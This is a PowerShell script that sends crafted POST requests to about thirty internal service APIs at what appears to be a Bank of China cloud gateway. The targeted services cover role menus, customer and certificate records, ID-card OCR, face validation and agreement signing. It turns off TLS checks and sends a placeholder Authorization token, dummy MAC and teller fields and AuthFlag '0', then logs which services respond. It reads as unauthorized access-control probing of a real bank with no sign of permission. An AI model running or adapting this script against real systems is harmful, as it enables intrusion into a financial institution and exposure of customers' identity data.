$apis = @(
    "SSP-AUTH/queryMenuTreeBySysIdRoleId",
    "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest",
    "SSP-AUTH/queryActionPermissionByMenuIdRoleId",
    "AGRE-AGRE/queryAgreementTemplateList",
    "AGRE-AGRE/queryAgreementTypeList",
    "AGRE-AGRE/getAgreementInfo",
    "CUST-INFO/getGeoData",
    "CHANNEL/getPlatformBaseInfoList",
    "CUST-INFO/selectPersonCust",
    "CUST-INFO/queryCustomerAssetArray",
    "CUST-INFO/queryPrepaidMerchantBaseInfo",
    "CUST-INFO/queryCustComponentDetail",
    "CUST-INFO/findListPartyIdentificationAuth",
    "CUST-INFO/selectCustCertificateList",
    "CUST-INFO/userActionAdd",
    "AGRE-AGRE/queryListByWorkEffortId",
    "AGRE-AGRE/signAgreement",
    "AGRE-AGRE/saveAgreementItem",
    "AGRE-AGRE/convertAgreenmentHtml2Pdf",
    "AGRE-AGRE/formatDocContent",
    "EC-IDEN/queryOrderDetail",
    "EC-IDEN/getOcrIdCardResult",
    "EC-IDEN/idcardOCR",
    "EC-IDEN/getFaceValidate",
    "EC-IDEN/completionOrderInfo",
    "CUST-RELA/addPartyRelationshipBasicInfo",
    "CHANNEL/shareDataStatAdd",
    "CHANNEL/shareInstProcess",
    "CHANNEL_MANAGE/validateChannel",
    "CUST-CSER/acCreateCommunicationEventResult"
)

foreach($api in $apis){
    $parts = $api -split '/'
    $service = $parts[1]
    $body = @{
        Header = @{
            CurrentPageNum = 1
            PageTotalNum = 10
            NoRetCode = $true
            BranchId = "800000"
            LegalRepCode = "10000"
            TranTeller = ""
            TranCode = $api
            TranDate = "20260716"
            TranTime = "004500000"
            ServiceName = $service
            ServiceCode = "D20190130"
            AuthFlag = "0"
            AuthrTellerNo = "1"
            Channel = "39"
            ConsumerId = "1"
            GlobalSeq = "1"
            GlobalSeqNo = "1"
            KeyId = "1"
            LocalLang = "1"
            Mac = "1"
            SourceSysId = "1111"
            TerminalCode = "1121"
            TranSeq = "1"
            TranSeqNo = "1"
            TranTellerNo = "1"
            ExtendContent = "1"
            TotalNum = "0"
        }
    } | ConvertTo-Json -Depth 5 -Compress
    
    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $body)
    
    $resp = curl.exe -sk --noproxy "*" --max-time 10 -X POST "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest" -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary "@$tempFile" 2>&1
    Remove-Item $tempFile -Force
    
    # 只显示RetCode和RetMsg
    if($resp -match '"RetCode":"([^"]+)".*?"RetMsg":"([^"]+)"'){
        Write-Output "[$api] RetCode=$($Matches[1]) RetMsg=$($Matches[2])"
    } elseif($resp -match '"RetMsg":"([^"]+)"'){
        Write-Output "[$api] RetMsg=$($Matches[1])"
    } else {
        Write-Output "[$api] => $($resp.Substring(0, [Math]::Min(200, $resp.Length)))"
    }
}